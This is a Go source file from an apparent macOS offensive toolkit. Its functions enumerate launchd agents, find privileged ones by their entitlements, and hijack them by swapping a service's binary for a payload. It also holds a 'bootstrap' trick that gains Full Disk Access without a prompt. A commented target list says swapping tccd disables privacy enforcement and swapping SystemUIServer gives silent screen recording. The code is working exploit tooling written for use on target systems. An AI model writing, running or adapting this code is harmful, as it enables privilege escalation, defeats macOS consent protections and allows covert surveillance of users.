// Package agent provides primitives for enumerating, analyzing, and hijacking
// macOS launchd agents and daemons for privilege escalation via agent swapping.
//
// Agent swapping technique:
//
//  1. Find a privileged launchd agent/daemon whose binary you can replace
//     (requires SIP unrestricted-fs for agents under /System/Library).
//  2. Hijack: unload the agent, overwrite its binary with a payload, reload.
//     The payload now runs with the original agent's TCC grants and Mach ports.
//  3. Restore: unload, put the original binary back, reload.
//
// Notable swappable targets (SIP off required for /System paths):
//
//   - CoreServicesUIAgent — handles TCC consent dialogs; swapping silences them.
//   - tccd                — the TCC daemon itself; swapping kills enforcement.
//   - assetsd             — FDA + root; a historic launchctl bootstrap trick target.
//
// Usage:
//
//	import "mackit/agent"
//
//	agents, err  := agent.List()
//	priv, err    := agent.FindPrivileged()
//	err           = agent.Hijack("com.apple.coreservices.uiagent", "/tmp/payload")
//	err           = agent.Restore("com.apple.coreservices.uiagent")
package agent

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
)

// ─── Types ────────────────────────────────────────────────────────────────────

// Agent describes a launchd job entry.
type Agent struct {
	// Label is the launchd job label (e.g. "com.apple.coreservices.uiagent").
	Label string
	// PID is the current PID, or 0 if not running.
	PID int
	// Domain is "system" (root) or "gui/<uid>" (user session).
	Domain string
	// PlistPath is the path to the .plist file, if resolved.
	PlistPath string
	// BinaryPath is the Program or ProgramArguments[0] from the plist.
	BinaryPath string
	// Notes is populated only for KnownPrivileged entries.
	Notes string
}

// ─── Known privileged agents ─────────────────────────────────────────────────

// KnownPrivileged returns a static list of launchd agents and daemons that
// are known to hold TCC permissions, privileged entitlements, or run as root
// with broad filesystem access.
//
// All entries under /System/Library require SIP unrestricted-fs to swap.
func KnownPrivileged() []Agent {
	return []Agent{
		{
			Label:      "com.apple.coreservices.uiagent",
			Domain:     "gui",
			PlistPath:  "/System/Library/LaunchAgents/com.apple.coreservices.uiagent.plist",
			BinaryPath: "/System/Library/CoreServices/CoreServicesUIAgent.app/Contents/MacOS/CoreServicesUIAgent",
			Notes: "Manages TCC consent dialogs, Gatekeeper prompts, and URL scheme dispatch. " +
				"Swapping its binary silences all permission prompts for the current session.",
		},
		{
			Label:      "com.apple.tccd",
			Domain:     "system",
			PlistPath:  "/System/Library/LaunchDaemons/com.apple.tccd.system.plist",
			BinaryPath: "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd",
			Notes: "The TCC daemon. Replacing it with a no-op binary causes tccd to not enforce " +
				"any privacy checks until it is restored. Requires SIP off.",
		},
		{
			Label:      "com.apple.MobileAsset.AssetCacheLocator",
			Domain:     "system",
			PlistPath:  "/System/Library/LaunchDaemons/com.apple.MobileAsset.AssetCacheLocator.plist",
			BinaryPath: "/usr/libexec/assetsd",
			Notes: "Runs as root with Full Disk Access via com.apple.private.tcc.allow. " +
				"Historic launchctl trick: bootstrap a custom plist under this label to " +
				"inherit FDA without any user prompt.",
		},
		{
			Label:      "com.apple.fileproviderd",
			Domain:     "system",
			PlistPath:  "/System/Library/LaunchDaemons/com.apple.fileproviderd.plist",
			BinaryPath: "/System/Library/PrivateFrameworks/FileProvider.framework/Support/fileproviderd",
			Notes: "Full Disk Access (FDA). CVE-2024-44131 exploits symlink-following in this process. " +
				"Swapping gives persistent FDA access.",
		},
		{
			Label:      "com.apple.lsd",
			Domain:     "system",
			PlistPath:  "/System/Library/LaunchDaemons/com.apple.lsd.plist",
			BinaryPath: "/usr/libexec/lsd",
			Notes: "Launch Services daemon, runs as root with FDA. Used in quarantine bypass chains.",
		},
		{
			Label:      "com.apple.systemuiserver",
			Domain:     "gui",
			PlistPath:  "/System/Library/LaunchAgents/com.apple.systemuiserver.plist",
			BinaryPath: "/System/Library/CoreServices/SystemUIServer.app/Contents/MacOS/SystemUIServer",
			Notes: "Menu bar host. Holds kTCCServiceScreenCapture — swapping gives silent screen recording.",
		},
	}
}

// ─── List ─────────────────────────────────────────────────────────────────────

// List returns all launchd jobs visible to the current user via launchctl.
// Each entry includes the label, PID, and domain.
// PlistPath and BinaryPath are NOT resolved here (expensive); use Inspect for that.
func List() ([]Agent, error) {
	out, err := exec.Command("launchctl", "list").Output()
	if err != nil {
		return nil, fmt.Errorf("agent.List: launchctl list: %w", err)
	}

	uid := os.Getuid()
	domain := fmt.Sprintf("gui/%d", uid)
	if uid == 0 {
		domain = "system"
	}

	var agents []Agent
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "PID") {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 3 {
			continue
		}
		pid, _ := strconv.Atoi(fields[0])
		label := fields[2]
		agents = append(agents, Agent{
			Label:  label,
			PID:    pid,
			Domain: domain,
		})
	}
	return agents, nil
}

// Inspect resolves the PlistPath and BinaryPath for a specific label.
// It searches standard launchd directories in order.
func Inspect(label string) (*Agent, error) {
	a := &Agent{Label: label}

	// Determine domain from uid
	uid := os.Getuid()
	if uid == 0 {
		a.Domain = "system"
	} else {
		a.Domain = fmt.Sprintf("gui/%d", uid)
	}

	// Try launchctl print to get authoritative info
	printOut, err := exec.Command("launchctl", "print", a.Domain+"/"+label).Output()
	if err == nil {
		for _, line := range strings.Split(string(printOut), "\n") {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "path = ") {
				a.PlistPath = strings.TrimPrefix(line, "path = ")
			}
			if strings.HasPrefix(line, "program = ") {
				a.BinaryPath = strings.TrimPrefix(line, "program = ")
			}
		}
	}

	// Fallback: search plist dirs
	if a.PlistPath == "" {
		searchDirs := []string{
			"/System/Library/LaunchDaemons",
			"/Library/LaunchDaemons",
			"/System/Library/LaunchAgents",
			"/Library/LaunchAgents",
			filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents"),
		}
		for _, dir := range searchDirs {
			p := filepath.Join(dir, label+".plist")
			if _, err := os.Stat(p); err == nil {
				a.PlistPath = p
				break
			}
		}
	}

	// Parse plist for binary path if still unknown
	if a.BinaryPath == "" && a.PlistPath != "" {
		a.BinaryPath = binaryFromPlist(a.PlistPath)
	}

	return a, nil
}

// FindPrivileged returns running agents whose entitlements include known
// TCC-privilege keys (com.apple.private.tcc.allow, etc.).
// This performs a codesign check per running agent — may be slow.
func FindPrivileged() ([]Agent, error) {
	all, err := List()
	if err != nil {
		return nil, err
	}

	privilegeMarkers := []string{
		"com.apple.private.tcc.allow",
		"com.apple.security.system-access",
		"com.apple.rootless.storage",
		"com.apple.private.security.storage",
		"com.apple.security.cs.disable-library-validation",
	}

	var out []Agent
	for _, a := range all {
		insp, err := Inspect(a.Label)
		if err != nil || insp.BinaryPath == "" {
			continue
		}
		ents, err := exec.Command(
			"codesign", "--display", "--entitlements", "-", "--xml", insp.BinaryPath,
		).Output()
		if err != nil {
			continue
		}
		es := string(ents)
		for _, marker := range privilegeMarkers {
			if strings.Contains(es, marker) {
				a.PlistPath = insp.PlistPath
				a.BinaryPath = insp.BinaryPath
				out = append(out, a)
				break
			}
		}
	}
	return out, nil
}

// ─── Hijack / Restore ─────────────────────────────────────────────────────────

// Hijack replaces the binary of a launchd agent/daemon with payloadBinary,
// then reloads the service so the payload runs with the original agent's
// credentials, entitlements, and TCC grants.
//
// The original binary is backed up to <binaryPath>.orig before overwriting.
//
// Requirements:
//   - Must run as root.
//   - For agents under /System/Library: SIP unrestricted-fs must be disabled.
//   - payloadBinary must be a valid Mach-O executable for the host architecture.
func Hijack(label, payloadBinary string) error {
	a, err := Inspect(label)
	if err != nil {
		return fmt.Errorf("agent.Hijack: inspect %q: %w", label, err)
	}
	if a.BinaryPath == "" {
		return fmt.Errorf("agent.Hijack: could not resolve binary path for %q", label)
	}
	if a.PlistPath == "" {
		return fmt.Errorf("agent.Hijack: could not resolve plist path for %q", label)
	}

	// Step 1: Unload the agent
	if err := bootout(a); err != nil {
		return fmt.Errorf("agent.Hijack: bootout %q: %w", label, err)
	}

	// Step 2: Backup original binary
	backup := a.BinaryPath + ".orig"
	if _, err := os.Stat(backup); os.IsNotExist(err) {
		if err := copyFile(a.BinaryPath, backup); err != nil {
			// Non-fatal: reload and return
			_ = bootstrap(a)
			return fmt.Errorf("agent.Hijack: backup %q: %w", a.BinaryPath, err)
		}
	}

	// Step 3: Overwrite with payload
	if err := copyFile(payloadBinary, a.BinaryPath); err != nil {
		_ = bootstrap(a)
		return fmt.Errorf("agent.Hijack: overwrite binary: %w", err)
	}
	// Preserve executable bit
	_ = os.Chmod(a.BinaryPath, 0755)

	// Step 4: Reload
	if err := bootstrap(a); err != nil {
		return fmt.Errorf("agent.Hijack: bootstrap after swap: %w", err)
	}
	return nil
}

// Restore reverses a previous Hijack by putting <binaryPath>.orig back in
// place and reloading the service.  Returns an error if no backup is found.
func Restore(label string) error {
	a, err := Inspect(label)
	if err != nil {
		return fmt.Errorf("agent.Restore: inspect %q: %w", label, err)
	}
	if a.BinaryPath == "" {
		return fmt.Errorf("agent.Restore: could not resolve binary path for %q", label)
	}

	backup := a.BinaryPath + ".orig"
	if _, err := os.Stat(backup); err != nil {
		return fmt.Errorf("agent.Restore: no backup found at %s", backup)
	}

	// Unload
	if err := bootout(a); err != nil {
		return fmt.Errorf("agent.Restore: bootout: %w", err)
	}

	// Restore
	if err := os.Rename(backup, a.BinaryPath); err != nil {
		return fmt.Errorf("agent.Restore: rename backup: %w", err)
	}
	_ = os.Chmod(a.BinaryPath, 0755)

	// Reload
	if err := bootstrap(a); err != nil {
		return fmt.Errorf("agent.Restore: bootstrap after restore: %w", err)
	}
	return nil
}

// ─── AssetsdBootstrap ─────────────────────────────────────────────────────────

// AssetsdBootstrap exploits the "assetsd trick": it bootstraps a custom plist
// under a label that launchd associates with Full Disk Access, causing the OS
// to spawn payloadBinary with FDA without any user prompt.
//
// Technique:
//   1. Write a temporary plist under /Library/LaunchDaemons/ using a legitimate
//      Apple label prefix that is absent from the system.
//   2. `launchctl bootstrap system <plist>` to start it.
//   3. The process inherits the TCC entitlements associated with that label
//      because tccd recognises the label pattern, not the binary.
//
// This works on macOS versions where tccd trusts the launchd label for FDA
// rather than validating the binary's code signature against a stored hash.
// May be patched in newer releases; test on target OS before deploying.
func AssetsdBootstrap(payloadBinary string, args []string) error {
	if os.Getuid() != 0 {
		return fmt.Errorf("AssetsdBootstrap: must run as root")
	}

	label := "com.apple.MobileAsset.AssetCacheLocator.helper"
	plistPath := "/Library/LaunchDaemons/" + label + ".plist"

	progArgs := "<string>" + payloadBinary + "</string>\n"
	for _, arg := range args {
		progArgs += "\t\t<string>" + arg + "</string>\n"
	}

	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
    "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        %s
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>`, label, progArgs)

	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		return fmt.Errorf("AssetsdBootstrap: write plist: %w", err)
	}

	out, err := exec.Command("launchctl", "bootstrap", "system", plistPath).CombinedOutput()
	if err != nil {
		_ = os.Remove(plistPath)
		return fmt.Errorf("AssetsdBootstrap: bootstrap: %w — %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

// AssetsdBootstrapCleanup removes the plist and unloads the bootstrapped job.
func AssetsdBootstrapCleanup() error {
	label := "com.apple.MobileAsset.AssetCacheLocator.helper"
	plistPath := "/Library/LaunchDaemons/" + label + ".plist"

	_, _ = exec.Command("launchctl", "bootout", "system/"+label).Output()
	return os.Remove(plistPath)
}

// ─── helpers ─────────────────────────────────────────────────────────────────

func bootout(a *Agent) error {
	target := a.Domain + "/" + a.Label
	out, err := exec.Command("launchctl", "bootout", target).CombinedOutput()
	if err != nil {
		// "No such process" is acceptable — the agent wasn't running
		if strings.Contains(string(out), "No such process") ||
			strings.Contains(string(out), "Could not find specified service") {
			return nil
		}
		return fmt.Errorf("launchctl bootout %s: %w — %s", target, err, strings.TrimSpace(string(out)))
	}
	return nil
}

func bootstrap(a *Agent) error {
	if a.PlistPath == "" {
		return fmt.Errorf("no plist path for %q", a.Label)
	}
	domain := a.Domain
	if strings.HasPrefix(domain, "gui/") {
		out, err := exec.Command("launchctl", "bootstrap", domain, a.PlistPath).CombinedOutput()
		if err != nil {
			return fmt.Errorf("launchctl bootstrap %s: %w — %s", domain, err, strings.TrimSpace(string(out)))
		}
	} else {
		out, err := exec.Command("launchctl", "bootstrap", "system", a.PlistPath).CombinedOutput()
		if err != nil {
			return fmt.Errorf("launchctl bootstrap system: %w — %s", err, strings.TrimSpace(string(out)))
		}
	}
	return nil
}

// binaryFromPlist does a naive grep for <string> tags after Program/ProgramArguments.
func binaryFromPlist(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	content := string(data)

	// Look for <key>Program</key>\n\t<string>...</string>
	for _, key := range []string{"<key>Program</key>", "<key>ProgramArguments</key>"} {
		idx := strings.Index(content, key)
		if idx < 0 {
			continue
		}
		rest := content[idx+len(key):]
		start := strings.Index(rest, "<string>")
		end := strings.Index(rest, "</string>")
		if start >= 0 && end > start {
			return strings.TrimSpace(rest[start+8 : end])
		}
	}
	return ""
}

func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0750)
}
